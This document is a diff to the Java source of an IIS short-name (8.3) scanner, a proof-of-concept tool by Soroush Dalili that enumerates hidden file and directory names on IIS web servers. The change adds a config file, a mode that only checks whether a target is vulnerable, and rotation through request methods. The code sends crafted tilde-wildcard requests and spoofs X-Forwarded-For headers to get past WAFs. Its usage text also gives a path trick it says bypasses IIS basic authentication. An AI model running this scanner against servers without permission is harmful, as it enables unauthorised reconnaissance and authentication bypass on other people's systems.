@@ -1,34 +1,43 @@
 import java.io.Console;
 import java.net.*;
 import java.util.*;
+
 import javax.net.ssl.*;
 
-public class scanner {
-	/* { Custom Config */
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.IOException;
+import java.util.Enumeration;
+import java.util.Properties;
 
-	private final static boolean debugMode = false;
-	private final static String strVersion = "2.0.0 - 31July2014";
-	private final static String customUserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10";
-	private final static String customCookie = "IIS_Shortname_Scanner_PoC=1;"; // Your cookie information. Can be a hidden value that will pass your WAF.
-	private final static String[][] additionalHeaders = {{"X-Forwarded-For","192.168.1.1"},{"X-Originating-IP","192.168.1.1"}}; // Additional headers such as Authorization header can be defined here
-	private final static String additionalQuery = "?aspxerrorpath=/"; // In order to see the errors better than a normal request
-	private final static String scanList = "0123456789abcdefghijklmnopqrstuvwxyz!#$%&'()-@^_`{}~"; //discard any of these to have more speed!
-	private static int maxConnectionTimeOut = 20000; // Miliseconds
-	private static int maxRetryTimes = 10;
-	private static String proxyServerName = ""; // Proxy will be ignored if this is empty
-	private static Integer proxyServerPort = 0;
-	private static Long maxDelayAfterEachRequest = (long) 0; // Delay after each request in milliseconds
-	private String[] magicFinalPartList = {"\\a.asp","/a.asp","\\a.aspx","/a.aspx","/a.shtml","/a.asmx","/a.ashx","/a.config","/a.php","/a.jpg","/a.xxx",""};
-	private String questionMarkSymbol = "?"; // in Windows we can sometimes use > instead of ?
-	private String asteriskSymbol = "*"; // in Windows we can sometimes use < instead of * - only change this if you need to (it misses items)
-	private String magicFileName = "*~1*"; // "*" will be replaced with asteriskSymbol variable later
-	private String magicFileExtension = "*"; // "*" will be replaced with asteriskSymbol variable later
-	private String requestMethod = "GET"; // GET, POST, HEAD, OPTIONS, PUT, DELETE, TRACE -- Sometimes OPTIONS is more effective than GET!
-	/* Custom Config }*/
+public class scanner {
 	/* Do not change the below lines if it's Greek to you!*/
+
+	private static boolean debugMode;
+	private static String customUserAgent;
+	private static String customCookie;
+	private static String additionalQuery;
+	private static String scanList;
+	private static int maxConnectionTimeOut;
+	private static int maxRetryTimes;
+	private static String proxyServerName;
+	private static Integer proxyServerPort;
+	private static Long maxDelayAfterEachRequest;
+	private static String questionMarkSymbol;
+	private static String asteriskSymbol;
+	private static String magicFileName;
+	private static String magicFileExtension;
+	private static String[] magicFinalPartList;
+	private static String[] additionalHeaders;
+	private static String[] requestMethod;
+	private static int acceptableDifferenceLengthBetweenResponses;
+	private static boolean onlyCheckForVulnerableSite = false;
+	private final static String configFile = "config.xml";
+	private final static String strVersion = "2.1.0 - 09August2014";
 	public Set<String> finalResultsFiles = new TreeSet<String>();
 	public Set<String> finalResultsDirs = new TreeSet<String>();
-	private String[] arrayScanList = scanList.split("");
+	private static String[] arrayScanList;
 	private String[] arrayScanListExt;
 	private String[] arrayScanListName;
 	private Set<String> scanListName = new TreeSet<String>();
@@ -38,6 +47,7 @@ public class scanner {
 	private static int showProgress;
 	private static int concurrentThreads;
 	private String magicFinalPart;
+	private String reliableRequestMethod;
 	private String validStatus = "";
 	private String invalidStatus = "";
 	private boolean boolIsQuestionMarkReliable = false;
@@ -52,24 +62,34 @@ public class scanner {
 		scanner obj = new scanner();
 
 		try {
-			if (args.length == 3) {
-				if (args[0].equals("0")) {
-					showProgress = 0; // Just show the final results
-				} else if (args[0].equals("1")) {
-					showProgress = 1; // Just show the findings one by one
-				} else {
-					showProgress = 2; // Show progress
-				}
-				concurrentThreads = Integer.parseInt(args[1]);
-				if (concurrentThreads < 0) {
+			if (args.length == 3 || args.length == 1) {
+				String url = "";
+				if(args.length==1){
+					// Only check for a vulnerable target
+					onlyCheckForVulnerableSite = true;
+					url = args[0];
+					showProgress = 2;
 					concurrentThreads = 0;
+				}else{
+					// Full Scan Mode
+					if (args[0].equals("0")) {
+						showProgress = 0; // Just show the final results
+					} else if (args[0].equals("1")) {
+						showProgress = 1; // Just show the findings one by one
+					} else {
+						showProgress = 2; // Show progress
+					}
+					concurrentThreads = Integer.parseInt(args[1]);
+					if (concurrentThreads < 0) {
+						concurrentThreads = 0;
+					}
+	
+					if (concurrentThreads > 0 && showProgress == 2) {
+						//showProgress = 1; // Show progress may not work beautifully in Multithread mode but I like it!
+					}
+	
+					url = args[2];
 				}
-
-				if (concurrentThreads > 0 && showProgress == 2) {
-					//showProgress = 1; // Show progress may not work beautifully in Multithread mode but I like it!
-				}
-
-				String url = args[2];
 				// Basic check for the URL
 				if(url.length()<8) throw new Exception(); // URL is too short
 				if(url.indexOf("?")>0)
@@ -81,6 +101,13 @@ public class scanner {
 				url = url.substring(0, url.lastIndexOf("/")+1);
 				if(url.length()<8) throw new Exception(); // URL is too short
 				System.out.println("Target = " + url);
+				
+				// Load the config file
+				System.out.println("-- Current Configuration -- Begin");
+				loadConfig();
+				System.out.println("-- Current Configuration -- End");
+				
+				arrayScanList = scanList.split("");
 				
 				Console console = System.console();
 				
@@ -147,26 +174,158 @@ public class scanner {
 			showUsage();
 		}
 	}
+	
+	private static void loadConfig() throws Exception{
+		try {
+			File file = new File(configFile);
+			FileInputStream fileInput = new FileInputStream(file);
+			Properties properties = new Properties();
+			
+			properties.loadFromXML(fileInput);
+			fileInput.close();
 
+			Enumeration enuKeys = properties.keys();			
+			String additionalHeadersDelimiter = "";
+			String additionalHeadersString = "";
+			String magicFinalPartDelimiter = "";
+			String magicFinalpartStringList = "";
+			String requestMethodDelimiter = "";
+			String requestMethodString = "";
+			
+			while (enuKeys.hasMoreElements()) {
+				String key = (String) enuKeys.nextElement();
+				String value = properties.getProperty(key);
+		
+				switch(key.toLowerCase()){
+					case "debug":
+						try{
+							debugMode = Boolean.parseBoolean(properties.getProperty(key));
+						}catch(Exception e){
+							debugMode = false;
+						}
+						break;
+					case "useragent":
+						customUserAgent = properties.getProperty(key,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10");
+						break;
+					case "cookies":
+						customCookie = properties.getProperty(key,"IIS_Short_File_Scanner=1");
+						break;
+					case "headersdelimiter":
+						additionalHeadersDelimiter = properties.getProperty(key,"@@");
+						break;
+					case "headers":
+						additionalHeadersString = properties.getProperty(key,"X-Forwarded-For: 127.0.0.1@@X-Originating-IP: 127.0.0.1@@X-Cluster-Client-Ip: 127.0.0.1");
+						break;
+					case "urlsuffix":
+						additionalQuery = properties.getProperty(key,"?&aspxerrorpath=/");
+						break;
+					case "inscopecharacters":
+						scanList = properties.getProperty(key,"0123456789abcdefghijklmnopqrstuvwxyz!#$%&'()-@^_`{}~");
+						break;
+					case "maxconnectiontimeout":
+						try{
+							maxConnectionTimeOut = Integer.parseInt(properties.getProperty(key,"20000"));
+						}catch(Exception e){
+							maxConnectionTimeOut = 20000;
+						}
+						break;
+					case "maxretrytimes":
+						try{
+							maxRetryTimes = Integer.parseInt(properties.getProperty(key,"10"));
+						}catch(Exception e){
+							maxRetryTimes = 10;
+						}
+						break;
+					case "proxyservername":
+						proxyServerName = properties.getProperty(key,"");
+						break;
+					case "proxyserverport":
+						try{
+							proxyServerPort = Integer.parseInt(properties.getProperty(key,"0"));
+						}catch(Exception e){
+							proxyServerPort = 0;
+						}
+						break;
+					case "maxdelayaftereachrequest":			
+						try{
+							maxDelayAfterEachRequest = Long.parseLong(properties.getProperty(key,"0"));
+						}catch(Exception e){
+							maxDelayAfterEachRequest = (long) 0;
+						}
+						break;
+					case "magicfinalpartdelimiter":
+						magicFinalPartDelimiter = properties.getProperty(key,",");
+						break;
+					case "magicfinalpartlist":
+						magicFinalpartStringList = properties.getProperty(key,"\\a.asp,/a.asp,\\a.aspx,/a.aspx,/a.shtml,/a.asmx,/a.ashx,/a.config,/a.php,/a.jpg,,/a.xxx");
+						break;
+					case "questionmarksymbol":
+						questionMarkSymbol = properties.getProperty(key,"?");
+						break;
+					case "asterisksymbol":
+						asteriskSymbol = properties.getProperty(key,"*");
+						break;
+					case "magicfilename":
+						magicFileName = properties.getProperty(key,"*~1*");
+						break;
+					case "magicfileextension":
+						magicFileExtension = properties.getProperty(key,"*");
+						break;
+					case "requestmethoddelimiter":
+						requestMethodDelimiter = properties.getProperty(key,",");
+						break;
+					case "requestmethod":
+						requestMethodString = properties.getProperty(key,"OPTIONS,GET,POST,HEAD,TRACE,TRACK");
+						break;						
+					case "acceptabledifferencelengthbetweenresponses":
+						try{
+							acceptableDifferenceLengthBetweenResponses = Integer.parseInt(properties.getProperty(key,"10"));
+						}catch(Exception e){
+							acceptableDifferenceLengthBetweenResponses = -1;
+						}
+						break;
+					default:
+						System.out.println("Unknown item in config file: " + key);
+				}
+				if(value=="") value = "Default";
+				System.out.println(key + ": " + value);
+			}
+			
+			additionalHeaders = additionalHeadersString.split(additionalHeadersDelimiter);
+			magicFinalPartList = magicFinalpartStringList.split(magicFinalPartDelimiter);
+			requestMethod = requestMethodString.split(requestMethodDelimiter);
+			
+		} catch (FileNotFoundException e) {
+			System.out.println("Config file was not found: " + configFile);
+			throw new Exception();
+		} catch (IOException e) {
+			System.out.println("Error in loading config file: " + configFile);
+			throw new Exception();
+		}	
+	}
+	
 	private static void showUsage() {
 		char[] delim = new char[75];
 		Arrays.fill(delim, '*');
 		System.out.println("");
 		System.out.println(String.valueOf(delim));
-		System.out.println("\r\n* IIS Shortname Scanner \r\n* by Soroush Dalili - @irsdl");
+		System.out.println("\r\n* IIS Short File/Folder Name (8.3) Scanner \r\n* by Soroush Dalili - @irsdl");
 		System.out.println("* Version: " + strVersion);
 		System.out.println("* WARNING: You are only allowed to run the scanner against the websites which you have given permission to scan. We do not accept any responsibility for any damage/harm that this application causes to your computer or your network as it is only a proof of concept and may lead to unknown issues. It is your responsibility to use this code legally and you are not allowed to sell this code in any way. The programmer is not responsible for any illegal or malicious use of this code. Be Ethical! \r\n");
 		System.out.println(String.valueOf(delim));
-		System.out.println("\r\nUSAGE:\r\n java scanner [ShowProgress] [ThreadNumbers] [URL]\r\n");
+		System.out.println("\r\nUSAGE 1 (To verify if the target is vulnerable):\r\n java scanner [URL]\r\n");
+		System.out.println("\r\nUSAGE 2 (To find 8.3 file names):\r\n java scanner [ShowProgress] [ThreadNumbers] [URL]\r\n");
 		System.out.println("DETAILS:");
 		System.out.println(" [ShowProgress]: 0= Show final results only - 1= Show final results step by step  - 2= Show Progress");
 		System.out.println(" [ThreadNumbers]: 0= No thread - Integer Number = Number of concurrent threads [be careful about IIS Denial of Service]");
 		System.out.println(" [URL]: A complete URL - starts with http/https protocol\r\n\r\n");
+		System.out.println("- Example 0 (to see if the target is vulnerable):\r\n java scanner http://example.com/folder/\r\n");
 		System.out.println("- Example 1 (uses no thread - very slow):\r\n java scanner 2 0 http://example.com/folder/new%20folder/\r\n");
 		System.out.println("- Example 2 (uses 20 threads - recommended):\r\n java scanner 2 20 http://example.com/folder/new%20folder/\r\n");
 		System.out.println("- Example 3 (saves output in a text file):\r\n java scanner 0 20 http://example.com/folder/new%20folder/ > c:\\results.txt\r\n");
 		System.out.println("- Example 4 (bypasses IIS basic authentication):\r\n java scanner 2 20 http://example.com/folder/AuthNeeded:$I30:$Index_Allocation/\r\n");
-		System.out.println("Note: Sometimes it does not work for the first time and you need to try again.");
+		System.out.println("Note 1: Edit config.xml file to change the scanner settings and add additional headers.");
+		System.out.println("Note 2: Sometimes it does not work for the first time and you need to try again.");
 	}
 
 	private void doScan(String url) throws Exception {
@@ -179,26 +338,40 @@ public class scanner {
 		if(!proxyServerName.equals("") && !proxyServerPort.equals("")){
 			proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyServerName, proxyServerPort));
 		}
-
-		for(String s:magicFinalPartList){
-			magicFinalPart = s;
-			isReliableResult = isReliable();
-			boolIsQuestionMarkReliable = isQuestionMarkReliable();
-			if (isReliableResult) {
-				if (concurrentThreads == 0) {
-					iterateScanFileName("");
-				} else {
-					scanListPurifier();
-					threadPool = new ThreadPool(concurrentThreads);
-					incThreadCounter(1);
-					threadPool.runTask(multithread_iterateScanFileName(""));
+		
+		for(String s1:magicFinalPartList){
+			for(String s2:requestMethod){
+				magicFinalPart = s1;
+				reliableRequestMethod = s2;
+				System.out.println("Testing request method: \"" + s2 + "\" with magic part: \""+ s1 + "\" ...");
+				isReliableResult = isReliable();
+				if (isReliableResult) {
+					System.out.println("Reliable request method was found = " + s2);
+					System.out.println("Reliable magic part was found = " + s1);
+					if(onlyCheckForVulnerableSite){
+						System.out.println(getReqCounter() + " requests have been sent to the server:");
+						System.out.println("\r\n<<< The target website is vulnerable! >>>");
+						return;
+					}else{
+						boolIsQuestionMarkReliable = isQuestionMarkReliable();
+						if (concurrentThreads == 0) {
+							iterateScanFileName("");
+						} else {
+							scanListPurifier();
+							threadPool = new ThreadPool(concurrentThreads);
+							incThreadCounter(1);
+							threadPool.runTask(multithread_iterateScanFileName(""));
+						}
+					}
+					break;
 				}
-				break;
 			}
+			if (isReliableResult) break;
 		}
+		
 		if(!isReliableResult)
 			System.err.println("Cannot get proper/different error messages from the server. Check the inputs and try again.");
-
+		
 		while (threadCounter != 0) {
 			Thread.sleep(1);
 		}
@@ -209,8 +382,13 @@ public class scanner {
 			String additionalData = "";
 			for (String s : finalResultsDirs) {
 				additionalData = "";
-				if  (s.indexOf("~") < 6)
-					additionalData = " -- Actual directory name = " + s.substring(0,s.indexOf("~"));
+				if  (s.indexOf("~") < 6){
+					if  (s.indexOf("~") == 5 && s.matches(".*(\\w\\d|\\d\\w).*")){
+						additionalData = " -- Possible directory name = " + s.substring(0,s.indexOf("~"));
+					}else{
+						additionalData = " -- Actual directory name = " + s.substring(0,s.indexOf("~"));
+					}
+				}
 				if  (s.length() - s.lastIndexOf(".") <= 3)
 					additionalData += " -- Actual extension = " + s.substring(s.lastIndexOf("."));
 		
@@ -220,16 +398,23 @@ public class scanner {
 
 			for (String s : finalResultsFiles) {
 				additionalData = "";
-				if  (s.indexOf("~") < 6)
-					additionalData = " -- Actual file name = " + s.substring(0,s.indexOf("~"));
+				if  (s.indexOf("~") < 6){	
+					if  (s.indexOf("~") == 5 && s.matches(".*(\\w\\d|\\d\\w).*")){
+						additionalData = " -- Possible file name = " + s.substring(0,s.indexOf("~"));
+					}else{
+						additionalData = " -- Actual file name = " + s.substring(0,s.indexOf("~"));
+					}
+				}
 				if  (s.length() - s.lastIndexOf(".") <= 3)
 					additionalData += " -- Actual extension = " + s.substring(s.lastIndexOf("."));
 				System.out.println("File: " + s + additionalData);
 			}
 		}
+		
 		System.out.println();
 		System.out.println(finalResultsDirs.size() + " Dir(s) was/were found");
 		System.out.println(finalResultsFiles.size() + " File(s) was/were found\r\n");
+		
 		// Show message for boolIsQuestionMarkReliable
 		if(!boolIsQuestionMarkReliable){
 			System.out.println("Question mark character was blocked: you may have a lot of false positives. -> manual check is needed.");
@@ -626,18 +811,35 @@ public class scanner {
 		return status;
 	}
 
+
 	private boolean isReliable() {
 		boolean result = false;
 		try {
 			validStatus = HTTPReqResponse("/" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
+			int validStatusLength = validStatus.length();
 			invalidStatus = HTTPReqResponse("/1234567890" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
-			if (!validStatus.equals(invalidStatus)) {
-				String tempInvalidStatus1 = HTTPReqResponse("/0123456789" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
-				String tempInvalidStatus2 = HTTPReqResponse("/0123456789" + asteriskSymbol + "~1.1234" + asteriskSymbol + magicFinalPart, 0);
+			int invalidStatusLength = invalidStatus.length();
+			
+			if (!validStatus.equals(invalidStatus) && !(acceptableDifferenceLengthBetweenResponses>=0 &&
+					Math.abs(invalidStatusLength - validStatusLength)<=acceptableDifferenceLengthBetweenResponses)) {
+				// We need to find the first character that is different in the comparison
 				
-				if (tempInvalidStatus1.equals(invalidStatus)) // If two different invalid requests lead to different answers, we cannot rely on the responses!
+				
+				String tempInvalidStatus1 = HTTPReqResponse("/0123456789" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
+				int tempInvalidStatus1Length = tempInvalidStatus1.length();
+				
+				String tempInvalidStatus2 = HTTPReqResponse("/0123456789" + asteriskSymbol + "~1.1234" + asteriskSymbol + magicFinalPart, 0);
+				int tempInvalidStatus2Length = tempInvalidStatus2.length();
+				
+				// If two different invalid requests lead to different responses, we cannot rely on them unless their length difference is negligible!
+				if (tempInvalidStatus1.equals(invalidStatus) || 
+						(acceptableDifferenceLengthBetweenResponses>=0 &&
+						Math.abs(invalidStatusLength - tempInvalidStatus1Length)<=acceptableDifferenceLengthBetweenResponses)) 
 				{
-					if (tempInvalidStatus2.equals(invalidStatus)){
+					
+					if (tempInvalidStatus2.equals(invalidStatus) || 
+							(acceptableDifferenceLengthBetweenResponses>=0 && 
+									Math.abs(tempInvalidStatus2Length - tempInvalidStatus1Length)<=acceptableDifferenceLengthBetweenResponses)){
 						boolIsExtensionReliable = true;
 					}else{
 						boolIsExtensionReliable = false;
@@ -769,12 +971,12 @@ public class scanner {
 				conn.setRequestProperty("Cookie", customCookie);
 			}
 			
-			for(String[] newHeader:additionalHeaders){
-				conn.setRequestProperty(newHeader[0], newHeader[1]);
+			for(String newHeader:additionalHeaders){
+				conn.setRequestProperty(newHeader.split(":")[0], newHeader.split(":")[1]);
 			}
 			
 			// Set the request method!
-			conn.setRequestMethod(requestMethod);
+			conn.setRequestMethod(reliableRequestMethod);
 			
 			int length = 0;
 			String responseHeaderStatus = "";
